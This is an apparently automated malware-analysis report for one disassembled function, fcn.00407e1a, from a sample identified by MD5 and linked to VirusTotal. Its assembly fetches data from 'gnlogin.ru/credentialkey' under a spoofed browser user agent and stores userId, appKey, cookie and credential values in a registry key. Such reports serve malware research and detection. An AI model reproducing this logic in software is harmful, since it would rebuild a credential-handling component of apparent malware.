---
layout: post
title:  "fcn.00407e1a @ 4bd33f73402d0d03c0318f793884eb34"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** fcn.00407e1a
- **Origin (md5):** 4bd33f73402d0d03c0318f793884eb34
- **VirusTotal:** [virustotal.com/gui/file/4bd33f73402d0d03c0318f793884eb34][virustotal_ref]

# Code Tags
<span class="tag" id="REGISTRY">REGISTRY</span>
<span class="tag" id="HTTP">HTTP</span>
<span class="tag" id="SOCKET">SOCKET</span>


# Similar Functions

1. [fcn.00406555][similar_1_ref] (sim.: 0.9172963224118159)
2. [fcn.0040735c][similar_2_ref] (sim.: 0.8951422243839257)
3. [fcn.004097f6][similar_3_ref] (sim.: 0.8922084968670498)
4. [fcn.00418b63][similar_4_ref] (sim.: 0.8898673356925417)
5. [fcn.00405750][similar_5_ref] (sim.: 0.8836133773291319)


# Disassembled Code

{% highlight nasm %}
mov eax,0x43d5c7
call fcn.0043c04c
sub esp,0xa0
push ebx
push esi
push edi
push 0xf
pop esi
push 0x22
xor ebx,ebx
push str.https:__gnlogin.ru__credentialkey
lea ecx,[ebp-0x70]
mov dword[ebp-0x5c],esi
mov dword[ebp-0x60],ebx
mov byte[ebp-0x70],bl
call fcn.00401f77
push 0xffffffffffffffff
push ebx
mov dword[ebp-4],ebx
push dword[ebp+0xc]
lea ecx,[ebp-0x70]
call fcn.004052ff
mov dword[ebp-0x78],esi
mov dword[ebp-0x7c],ebx
mov byte[ebp-0x8c],bl
mov byte[ebp-4],1
mov eax,dword[ebp+8]
cmp dword[eax+0x28],ebx
je 0x407f2d
push ebx
push ebx
push ebx
push ebx
push str.Installer__compatible__MSIE_6.0b__Windows_NT_5.0__.NET_CLR_1.0.2914_
call dword[sym.imp.WININET.dll_InternetOpenA]
mov esi,eax
mov dword[ebp-0x48],esi
cmp esi,ebx
je 0x407f2d
cmp dword[ebp-0x5c],0x10
mov eax,dword[ebp-0x70]
jae 0x407e9f
lea eax,[ebp-0x70]
push ebx
push 0x84403900
push 0xffffffffffffffff
push str.Accept:__
push eax
push esi
call dword[sym.imp.WININET.dll_InternetOpenUrlA]
mov dword[ebp+0xc],eax
mov byte[ebp-4],3
cmp eax,ebx
jne 0x407ec8
push esi
call dword[sym.imp.WININET.dll_InternetCloseHandle]
jmp 0x407f2d
mov edi,0x20000
lea esi,[ebp-0x20]
mov dword[ebp+8],ebx
mov dword[ebp-0x4c],ebx
call fcn.00406826
mov byte[ebp-4],4
mov edi,dword[ebp-0x20]
cmp edi,ebx
jne 0x407ee9
push ebx
jmp 0x407f17
mov esi,dword[sym.imp.WININET.dll_InternetReadFile]
jmp 0x407f05
cmp dword[ebp+8],ebx
jbe 0x407f5c
push dword[ebp+8]
lea ecx,[ebp-0x8c]
push edi
call fcn.004050b3
lea eax,[ebp+8]
push eax
push dword[ebp-0x1c]
push edi
push dword[ebp+0xc]
call esi
test eax,eax
jne 0x407ef1
push edi
call fcn.00423efe
mov esi,dword[sym.imp.WININET.dll_InternetCloseHandle]
pop ecx
push dword[ebp+0xc]
call esi
push dword[ebp-0x48]
call esi
push 3
pop esi
push ebx
push 1
lea ecx,[ebp-0x8c]
call fcn.00401bdc
push ebx
push 1
lea ecx,[ebp-0x70]
call fcn.00401bdc
mov ecx,dword[ebp-0xc]
pop edi
mov eax,esi
pop esi
mov dword fs:[0],ecx
pop ebx
leave
ret 8
push ebx
lea eax,[ebp-0x54]
push eax
lea eax,[ebp-0x4c]
push eax
push 0x20000013
push dword[ebp+0xc]
mov dword[ebp-0x54],4
call dword[sym.imp.WININET.dll_HttpQueryInfoW]
test eax,eax
je 0x407f16
cmp dword[ebp-0x4c],0xc8
jne 0x407f16
push edi
call fcn.00423efe
mov esi,dword[sym.imp.WININET.dll_InternetCloseHandle]
pop ecx
push dword[ebp+0xc]
call esi
push dword[ebp-0x48]
call esi
cmp dword[ebp-0x78],0x10
mov eax,dword[ebp-0x8c]
mov dword[ebp-0x50],ebx
jae 0x407fb3
lea eax,[ebp-0x8c]
lea ecx,[ebp-0x50]
push ecx
push 0x4426e8
push eax
call fcn.004240c6
add esp,0xc
xor edi,edi
mov esi,eax
mov dword[ebp-0x28],ebx
mov dword[ebp-0x24],edi
mov dword[ebp-0x20],ebx
mov byte[ebp-4],5
jmp 0x408085
push esi
lea ecx,[ebp-0x44]
mov dword[ebp-0x30],0xf
mov dword[ebp-0x34],ebx
mov byte[ebp-0x44],bl
call fcn.00401bb9
lea eax,[ebp-0x44]
mov byte[ebp-4],6
cmp eax,edi
jae 0x408033
cmp dword[ebp-0x28],eax
ja 0x408033
sub eax,dword[ebp-0x28]
push 0x1c
cdq
pop ecx
idiv ecx
mov esi,eax
cmp edi,dword[ebp-0x20]
jne 0x40801c
lea ecx,[ebp-0x28]
call fcn.004085f9
mov edi,dword[ebp-0x24]
imul esi,esi,0x1c
add esi,dword[ebp-0x28]
mov dword[ebp+0xc],edi
mov dword[ebp+8],edi
mov byte[ebp-4],7
cmp edi,ebx
je 0x40805c
push esi
jmp 0x408055
cmp edi,dword[ebp-0x20]
jne 0x408043
lea ecx,[ebp-0x28]
call fcn.004085f9
mov edi,dword[ebp-0x24]
mov dword[ebp+0xc],edi
mov dword[ebp+8],edi
mov byte[ebp-4],8
cmp edi,ebx
je 0x40805c
lea eax,[ebp-0x44]
push eax
mov ecx,edi
call fcn.00402834
lea eax,[ebp-0x50]
push eax
push 0x4426e8
add edi,0x1c
push ebx
mov dword[ebp-0x24],edi
call fcn.004240c6
add esp,0xc
push ebx
push 1
lea ecx,[ebp-0x44]
mov esi,eax
mov byte[ebp-4],5
call fcn.00401bdc
cmp esi,ebx
jne 0x407fdb
mov esi,dword[ebp-0x28]
mov eax,edi
sub eax,esi
push 0x1c
cdq
pop ecx
idiv ecx
cmp eax,4
jae 0x4080c6
cmp esi,ebx
je 0x4080bf
jmp 0x4080b2
push ebx
push 1
mov ecx,esi
call fcn.00401bdc
add esi,0x1c
cmp esi,edi
jne 0x4080a5
push dword[ebp-0x28]
call fcn.00423efe
pop ecx
push 2
jmp 0x407f2f
push 0x12
push str.SoftwareGGSQGNA
lea ecx,[ebp-0xa8]
mov dword[ebp-0x94],0xf
mov dword[ebp-0x98],ebx
mov byte[ebp-0xa8],bl
call fcn.00401f77
xor edx,edx
lea ecx,[ebp-0xa8]
inc edx
lea esi,[ebp-0x18]
call fcn.0040750e
push ebx
push 1
lea ecx,[ebp-0xa8]
mov byte[ebp-4],9
call fcn.00401bdc
push 0xf
pop esi
push 6
push str.userId
lea ecx,[ebp-0x44]
mov dword[ebp-0x30],esi
mov dword[ebp-0x34],ebx
mov byte[ebp-0x44],bl
call fcn.00401f77
push ebx
lea eax,[ebp-0x28]
mov byte[ebp-4],0xa
call fcn.0040b4fa
lea ecx,[ebp-0x44]
lea edx,[ebp-0x18]
call fcn.0040756c
push ebx
push 1
lea ecx,[ebp-0x44]
mov byte[ebp-4],9
call fcn.00401bdc
push 6
push str.appKey
lea ecx,[ebp-0x44]
mov dword[ebp-0x30],esi
mov dword[ebp-0x34],ebx
mov byte[ebp-0x44],bl
call fcn.00401f77
push 1
lea eax,[ebp-0x28]
mov byte[ebp-4],0xb
call fcn.0040b4fa
lea ecx,[ebp-0x44]
lea edx,[ebp-0x18]
call fcn.0040756c
push ebx
push 1
lea ecx,[ebp-0x44]
mov byte[ebp-4],9
call fcn.00401bdc
push 6
push str.cookie
lea ecx,[ebp-0x44]
mov dword[ebp-0x30],esi
mov dword[ebp-0x34],ebx
mov byte[ebp-0x44],bl
call fcn.00401f77
push 2
lea eax,[ebp-0x28]
mov byte[ebp-4],0xc
call fcn.0040b4fa
lea ecx,[ebp-0x44]
lea edx,[ebp-0x18]
call fcn.0040756c
push ebx
push 1
lea ecx,[ebp-0x44]
mov byte[ebp-4],9
call fcn.00401bdc
mov dword[ebp-0x30],esi
push 3
push 0x442718
lea ecx,[ebp-0x44]
mov dword[ebp-0x34],ebx
mov byte[ebp-0x44],bl
call fcn.00401f77
push 3
lea eax,[ebp-0x28]
mov byte[ebp-4],0xd
call fcn.0040b4fa
lea ecx,[ebp-0x44]
lea edx,[ebp-0x18]
call fcn.0040756c
push ebx
push 1
lea ecx,[ebp-0x44]
mov byte[ebp-4],9
call fcn.00401bdc
push 0xe
push str.SaveCredential
lea ecx,[ebp-0x44]
mov dword[ebp-0x30],esi
mov dword[ebp-0x34],ebx
mov byte[ebp-0x44],bl
call fcn.00401f77
xor esi,esi
inc esi
mov dword[ebp+0xc],esi
cmp byte[ebp-0x14],bl
je 0x408255
cmp dword[ebp-0x30],0x10
mov eax,dword[ebp-0x44]
jae 0x408242
lea eax,[ebp-0x44]
push 4
lea ecx,[ebp+0xc]
push ecx
push 4
push ebx
push eax
push dword[ebp-0x18]
call dword[sym.imp.ADVAPI32.dll_RegSetValueExA]
push ebx
push esi
lea ecx,[ebp-0x44]
call fcn.00401bdc
cmp byte[ebp-0x14],bl
je 0x40826d
push dword[ebp-0x18]
call dword[sym.imp.ADVAPI32.dll_RegCloseKey]
mov esi,dword[ebp-0x28]
cmp esi,ebx
je 0x408290
jmp 0x408283
push ebx
push 1
mov ecx,esi
call fcn.00401bdc
add esi,0x1c
cmp esi,edi
jne 0x408276
push dword[ebp-0x28]
call fcn.00423efe
pop ecx
xor esi,esi
inc esi
jmp 0x407f30
{% endhighlight %}


[similar_1_ref]: /report/fcn.00406555@ba5ec83721de3ca10b3c9583f3b2c6a1
[similar_2_ref]: /report/fcn.0040735c@4bd33f73402d0d03c0318f793884eb34
[similar_3_ref]: /report/fcn.004097f6@418e0921f3a9bd4f5bc0dcc59623b5a1
[similar_4_ref]: /report/fcn.00418b63@ba5ec83721de3ca10b3c9583f3b2c6a1
[similar_5_ref]: /report/fcn.00405750@69b3c79878674ea715338a112bb5caa6
[virustotal_ref]: https://www.virustotal.com/gui/file/4bd33f73402d0d03c0318f793884eb34